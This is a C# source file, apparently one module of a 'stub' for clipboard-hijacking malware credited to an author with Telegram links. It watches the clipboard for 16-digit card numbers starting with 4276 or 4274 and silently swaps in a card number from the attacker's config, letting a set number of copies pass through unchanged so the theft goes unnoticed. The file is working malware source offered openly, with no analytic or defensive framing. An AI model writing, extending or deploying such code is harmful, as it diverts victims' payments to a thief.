/* 
    Author : Megavolt
	Telegram Group : t.me/DOLFX
    Github : github.com/Megavolt666
	Telegram Author : t.me/megavoltcoder
*/
using System.Windows.Forms;

namespace stubOnion
{
    class VisaSber
    {
        public static int _oppToMiss;
        public static void GetVisaSber()
        {
            try
            {
                if (Clipboard.ContainsText())
                {

                        var clpbrd = Clipboard.GetText();

                        if (clpbrd.Length == 16)
                        {
                            if (clpbrd.StartsWith("4276") || clpbrd.StartsWith("4274"))
                            {
                            if (_oppToMiss > 0)
                            {
                                _oppToMiss--;
                                return;
                            }
                            _oppToMiss = Config.OppToMissDef;
                            Clipboard.SetText(Config.visasbr);
                            }
                            else
                            {
                                return;
                            }

                        }
                        else
                        {
                            return;
                        }

                }
                else
                {
                    return;
                }
            }
            catch { }
        }
    }
}
